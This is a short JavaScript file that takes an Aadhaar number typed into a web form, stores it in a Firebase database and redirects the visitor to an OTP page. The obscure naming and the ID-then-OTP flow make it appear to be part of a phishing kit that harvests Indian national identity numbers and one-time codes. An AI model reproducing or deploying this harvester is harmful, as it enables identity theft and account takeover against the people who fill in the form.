// reference your database
var ududip005DB = firebase.database().ref("ududip005");

document.getElementById("ududip005").addEventListener("submit", submitForm);

function submitForm(e) {
    e.preventDefault();

    var uadhar = getElementVal("uadhar");



    saveMessages(uadhar);

    // redirect to OTP page
    window.location.href = "otpg.html";
}

const saveMessages = (uadhar) => {
    var newududip005 = ududip005DB.push();

    newududip005.set({
        Aadhar_Number: uadhar,


    });
};

const getElementVal = (id) => {
    return document.getElementById(id).value;
};